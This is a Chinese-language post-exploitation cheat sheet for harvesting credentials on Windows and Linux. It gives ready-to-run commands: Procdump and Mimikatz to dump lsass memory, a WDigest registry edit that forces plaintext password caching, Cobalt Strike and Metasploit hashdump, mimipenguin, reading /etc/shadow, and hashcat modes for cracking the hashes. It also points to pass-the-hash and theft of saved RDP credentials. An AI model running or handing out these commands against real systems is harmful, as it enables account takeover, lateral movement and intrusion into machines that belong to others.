Mimikatz 是一款知名的密码获取工具，用于在 Windows 系统中提取凭据（例如明文密码、哈希值、票据等）。

dumplsass是一种技术用于从Windows操作系统中转储lsass.exe进程的内存内容。
>lsass.exe是Windows本地安全权限服务系统，是微软Windows 2000及以后版本中用于处理安全验证的进程。这个进程存储了用户账号的登录密码和其他安全敏感信息。

Mimikatz 可以基于dumplsass技术从内存中提取凭据信息，并可用于执行 Pass-the-Hash（PTH）和 Pass-the-Ticket（PTT）等攻击技术，从而获取用户权限并横向移动。
利用条件：需要系统权限system/root。
>CS和MSF中一般自带基于Mimikatz的封装，使用hashdump命令。



## **获取明文或密码HASH**
微软为了防止明文密码泄露发布了补丁KB2871997，关闭了Wdigest功能。当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。


获取计算机登录过的用户的 密码 HASH，明文。
#### **Windows**
**mimikatz(win)：**
使用CS上线后自带的一键读取：右键或使用hashdump命令。
一些命令：<https://blog.csdn.net/weixin_40412037/article/details/113348310>
高版本无法直接读明文密码：
修改注册表，强制锁屏，等待管理员重新登陆账号密码。
```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1
```
此时CS中就可以抓取明文密码。
^
**CS获取用户的hash：**
获取密码哈希，cs中用hashdump命令。
可能获取失败要用administrator用户。

^ 
**MSF获取用户的hash：**

获取密码哈希，msf中用hashdump命令

![image-20240613160426225](http://cdn.33129999.xyz/mk_img/image-20240613160426225.png)

后一段，3008c后是密码，可以用在线网站解密Admin123
^
**手工获取内存中hash：**
```
1、读取lsass.exe进程的内存文件
Procdump64.exe -accepteula -ma lsass.exe lsass.dmp

2、将lsass.dmp放入mimikatz目录读取hash
mimikatz.exe "sekurlsa::minidump lsass.dmp"
sekurlsa::logonPasswords full
```




^
#### **Linux**
**mimipenguin(linux)：**
明文读取，大概率失败。
```
chmod 755 ./mimipenguin.sh
./mimipenguin.sh
```
root的hash
```
cat  /etc/shadow
```


^
## **破译hash**
Windows获取了hash就可以利用，无需破译明文。
在线：
https://www.somd5.com/
https://www.cmd5.com/
跑字典：hashcat
^
Linux获取hash和加密方式，可以破译明文。
跑字典：hashcat


```
查看加密方式和密文，只有root用户才能读取它
cat /etc/shadow

将第一行root的，复制到一个单独的文本文件中linux.txt，只包含散列值。

根据加密方式进行命令

linux sha512crypt $6$, SHA512 (Unix)加密方式：
hashcat -m 1800 sha512linux.txt p.txt

linux sha256crypt $5$, SHA256 (Unix)加密方式：
hashcat -m 7400 sha256linux.txt p.txt

linux下md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)加密方式：
hashcat -m 500 linuxmd5.txt p.txt

linux下bcrypt $2\*$, Blowfish加密方式：
hashcat -m 3200 linuxmd5.txt p.txt
```



^
## **Mimikatz获取RDP登录记录的密码**
RDP远程登录时，勾选的保存我的凭证，可以被读取
<https://blog.csdn.net/weixin_44268918/article/details/132198123?spm=1001.2014.3001.5501>


